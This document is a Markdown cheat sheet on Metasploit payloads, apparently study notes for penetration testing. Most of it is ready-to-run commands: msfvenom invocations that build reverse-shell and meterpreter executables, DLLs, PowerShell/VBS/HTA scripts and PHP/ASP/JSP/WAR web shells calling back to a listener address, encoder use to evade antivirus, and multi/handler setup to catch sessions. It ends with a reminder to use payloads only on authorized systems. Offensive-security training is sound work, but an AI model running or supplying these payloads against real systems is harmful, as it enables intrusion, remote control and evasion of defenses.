# Payloads

## What are Payloads?
- Payloads are code that runs on target system after exploitation
- They give attacker control over compromised system
- Delivered by exploit modules to target
- Different payloads for different purposes and platforms
- Most important component of exploitation process
- Wrong payload selection causes exploitation failure

---

## Payload Architecture

### Singles
- Complete self contained payload
- Everything in one piece of code
- Larger in size
- More reliable delivery
- Does not need second stage
- Example: windows/shell_reverse_tcp

### Stagers
- Small first stage payload
- Sets up connection channel
- Downloads second stage from attacker
- Fits in limited memory space
- Denoted by / in name
- Example: windows/meterpreter/reverse_tcp

### Stages
- Second stage downloaded by stager
- Contains full functionality
- Much larger than stager
- Examples: meterpreter shell vncinject

---

## Payload Connection Types

### Reverse Payloads
- Target connects back to attacker machine
- Bypasses firewall on target
- Most commonly used type
- Attacker must be listening before exploit
- Keywords: reverse_tcp reverse_https reverse_http

### Bind Payloads
- Payload opens listening port on target
- Attacker connects to target
- Often blocked by firewall
- Useful when attacker cannot receive connections
- Keywords: bind_tcp bind_http

### Findport Payloads
- Finds existing open connection
- Reuses existing channel
- Less common than reverse and bind

---

## Payload Categories

### Shell Payloads
- Basic command shell access
- Windows gives cmd.exe
- Linux gives bash or sh
- No advanced features
- Simpler and smaller than meterpreter
- Good for basic access

### Meterpreter Payloads
- Advanced interactive payload
- Runs entirely in memory
- Encrypted communication
- Many built in commands
- Most powerful payload option
- Best choice for most engagements

### VNC Payloads
- Provides graphical desktop access
- Shows actual desktop of target
- Larger payload size
- Useful for demonstrating access visually

### PowerShell Payloads
- Windows PowerShell based payload
- Good for Windows environments
- Can bypass some security controls
- Useful for fileless attacks

---

## Windows Payloads

### Windows Meterpreter Payloads
```bash
# 32 bit reverse TCP meterpreter
windows/meterpreter/reverse_tcp

# 64 bit reverse TCP meterpreter
windows/x64/meterpreter/reverse_tcp

# 32 bit reverse HTTPS meterpreter encrypted
windows/meterpreter/reverse_https

# 64 bit reverse HTTPS meterpreter encrypted
windows/x64/meterpreter/reverse_https

# 32 bit reverse HTTP meterpreter
windows/meterpreter/reverse_http

# 64 bit bind TCP meterpreter
windows/x64/meterpreter/bind_tcp

# stageless 32 bit meterpreter
windows/meterpreter_reverse_tcp

# stageless 64 bit meterpreter
windows/x64/meterpreter_reverse_tcp
```

### Windows Shell Payloads
```bash
# 32 bit reverse TCP shell
windows/shell/reverse_tcp

# 64 bit reverse TCP shell
windows/x64/shell/reverse_tcp

# 32 bit bind TCP shell
windows/shell/bind_tcp

# stageless reverse shell
windows/shell_reverse_tcp
```

### Windows PowerShell Payloads
```bash
# PowerShell reverse TCP
windows/powershell_reverse_tcp

# 64 bit PowerShell reverse TCP
windows/x64/powershell_reverse_tcp
```

### Windows VNC Payloads
```bash
# VNC inject payload
windows/vncinject/reverse_tcp

# 64 bit VNC inject
windows/x64/vncinject/reverse_tcp
```

---

## Linux Payloads

### Linux Meterpreter Payloads
```bash
# 32 bit Linux meterpreter
linux/x86/meterpreter/reverse_tcp

# 64 bit Linux meterpreter
linux/x64/meterpreter/reverse_tcp

# 32 bit stageless meterpreter
linux/x86/meterpreter_reverse_tcp

# 64 bit stageless meterpreter
linux/x64/meterpreter_reverse_tcp

# ARM meterpreter for IoT devices
linux/armle/meterpreter/reverse_tcp
```

### Linux Shell Payloads
```bash
# 32 bit reverse shell
linux/x86/shell/reverse_tcp

# 64 bit reverse shell
linux/x64/shell/reverse_tcp

# stageless reverse shell
linux/x86/shell_reverse_tcp

# bind shell
linux/x86/shell/bind_tcp
```

---

## Web Application Payloads

### PHP Payloads
```bash
# PHP meterpreter reverse TCP
php/meterpreter/reverse_tcp

# PHP stageless meterpreter
php/meterpreter_reverse_tcp

# PHP reverse shell
php/reverse_php
```

### Java Payloads
```bash
# Java meterpreter reverse TCP
java/meterpreter/reverse_tcp

# Java shell reverse TCP
java/shell/reverse_tcp

# Java bind TCP
java/meterpreter/bind_tcp
```

### Python Payloads
```bash
# Python meterpreter reverse TCP
python/meterpreter/reverse_tcp

# Python stageless meterpreter
python/meterpreter_reverse_tcp

# Python reverse shell
python/shell_reverse_tcp
```

### ASP Payloads
```bash
# ASP meterpreter reverse TCP
windows/meterpreter/reverse_tcp
# format as asp using msfvenom -f asp
```

---

## Android Payloads
```bash
# Android meterpreter reverse TCP
android/meterpreter/reverse_tcp

# Android reverse shell
android/shell/reverse_tcp

# stageless Android meterpreter
android/meterpreter_reverse_tcp
```

---

## macOS Payloads
```bash
# macOS meterpreter reverse TCP
osx/x64/meterpreter/reverse_tcp

# macOS shell reverse TCP
osx/x64/shell/reverse_tcp

# macOS stageless meterpreter
osx/x64/meterpreter_reverse_tcp
```

---

## Setting Payloads in msfconsole
```bash
# list all payloads
show payloads

# list payloads for current exploit
show payloads

# set specific payload
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set PAYLOAD php/meterpreter/reverse_tcp

# set payload options
set LHOST 192.168.1.100
set LPORT 4444

# verify payload options
show options
```

---

## msfvenom Payload Generation

### What is msfvenom?
- Standalone payload generator tool
- Combines old msfpayload and msfencode
- Used to create payload files
- Generates executables scripts and shellcode
- Used when payload delivered manually

### Basic msfvenom Syntax
```bash
msfvenom -p PAYLOAD LHOST=IP LPORT=PORT -f FORMAT -o OUTPUT_FILE
```

### Windows Payload Generation
```bash
# generate Windows exe payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload.exe

# generate 64 bit Windows exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f exe -o payload64.exe

# generate Windows DLL payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f dll -o payload.dll

# generate Windows PowerShell payload
msfvenom -p windows/x64/powershell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f ps1 -o payload.ps1

# generate Windows VBScript payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f vbs -o payload.vbs

# generate Windows HTA payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f hta-psh -o payload.hta
```

### Linux Payload Generation
```bash
# generate Linux ELF payload
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload.elf

# generate 64 bit Linux ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf -o payload64.elf

# make executable
chmod +x payload.elf
```

### Web Payload Generation
```bash
# generate PHP payload
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.php

# generate ASP payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f asp -o shell.asp

# generate ASPX payload
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f aspx -o shell.aspx

# generate JSP payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.jsp

# generate WAR payload
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f war -o shell.war
```

### Android Payload Generation
```bash
# generate Android APK payload
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -o payload.apk
```

### macOS Payload Generation
```bash
# generate macOS payload
msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f macho -o payload.macho
```

---

## Payload Encoding

### Why Encode Payloads?
- Bypass antivirus detection
- Bypass intrusion detection systems
- Obfuscate payload code
- Change payload signature

### Listing Encoders
```bash
# list all available encoders
msfvenom -l encoders
```

### Common Encoders
- x86/shikata_ga_nai → most popular polymorphic encoder
- x86/xor_dynamic → XOR based encoder
- x64/xor → 64 bit XOR encoder
- cmd/powershell_base64 → base64 PowerShell encoder
- php/base64 → base64 PHP encoder

### Encoding Payloads
```bash
# encode with shikata_ga_nai
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -f exe -o encoded.exe

# encode multiple iterations
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe -o encoded5.exe

# encode 64 bit payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.100 LPORT=4444 -e x64/xor -f exe -o encoded64.exe
```

---

## Payload Formats

### Executable Formats
```bash
# list all formats
msfvenom -l formats

# common executable formats
-f exe       # Windows executable
-f elf       # Linux executable
-f macho     # macOS executable
-f apk       # Android package
-f dll       # Windows DLL
```

### Script Formats
```bash
-f ps1       # PowerShell script
-f vbs       # VBScript
-f hta-psh   # HTML Application
-f bash      # Bash script
-f python    # Python script
-f ruby      # Ruby script
-f perl      # Perl script
```

### Web Formats
```bash
-f php       # PHP script
-f asp       # ASP script
-f aspx      # ASPX script
-f jsp       # JSP script
-f war       # Java WAR archive
```

### Shellcode Formats
```bash
-f c         # C language shellcode
-f python    # Python shellcode
-f ruby      # Ruby shellcode
-f raw       # Raw binary shellcode
-f hex       # Hex encoded shellcode
```

---

## Catching Payloads with Multi Handler

### Setting Up Listener
```bash
# use multi handler
use exploit/multi/handler

# set matching payload
set PAYLOAD windows/meterpreter/reverse_tcp

# set listener options
set LHOST 192.168.1.100
set LPORT 4444

# run listener in background
exploit -j

# when payload executes session opens
sessions -l
sessions -i 1
```

### Handling Multiple Sessions
```bash
# run handler for multiple connections
exploit -j

# list all sessions
sessions -l

# interact with specific session
sessions -i 1
sessions -i 2

# run command on all sessions
sessions -C "sysinfo"
```

---

## Payload Selection Guide

### For Windows Targets
```bash
# best choice 64 bit
windows/x64/meterpreter/reverse_tcp

# if 32 bit target
windows/meterpreter/reverse_tcp

# for encrypted communication
windows/x64/meterpreter/reverse_https

# for basic shell only
windows/x64/shell/reverse_tcp
```

### For Linux Targets
```bash
# check architecture first
# 64 bit target
linux/x64/meterpreter/reverse_tcp

# 32 bit target
linux/x86/meterpreter/reverse_tcp

# ARM IoT device
linux/armle/meterpreter/reverse_tcp
```

### For Web Applications
```bash
# PHP application
php/meterpreter/reverse_tcp

# Java application
java/meterpreter/reverse_tcp

# ASP or ASPX application
windows/meterpreter/reverse_tcp
```

---
## Important Points
- Always match payload architecture to target system
- Use reverse payloads to bypass target firewall
- Use HTTPS payloads for encrypted communication
- Use multi handler to catch manually delivered payloads
- Encoding does not guarantee antivirus bypass
- 64 bit payloads only work on 64 bit targets
- Stageless payloads are more reliable but larger
- Always set LHOST to actual Kali IP not localhost
- Test payloads on lab environment before real engagement
- Always use payloads only on authorized systems
```

---

